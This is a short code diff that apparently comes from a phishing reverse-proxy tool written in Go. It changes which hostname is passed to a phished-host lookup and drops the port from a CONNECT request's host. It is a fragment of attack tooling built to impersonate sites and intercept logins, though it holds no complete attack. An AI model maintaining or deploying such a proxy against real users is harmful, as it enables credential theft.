@@ -1107,7 +1107,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			var ok bool
 			phish_host := ""
 			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
+				phish_host, ok = p.replaceHostWithPhished(host)
 				if !ok {
 					log.Debug("phishing hostname not found: %s", hostname)
 					return nil, fmt.Errorf("phishing hostname not found")
@@ -1199,7 +1199,7 @@ func (p *HttpProxy) httpsWorker() {
 				Method: "CONNECT",
 				URL: &url.URL{
 					Opaque: hostname,
-					Host:   net.JoinHostPort(hostname, "443"),
+					Host:   hostname,
 				},
 				Host:       hostname,
 				Header:     make(http.Header),
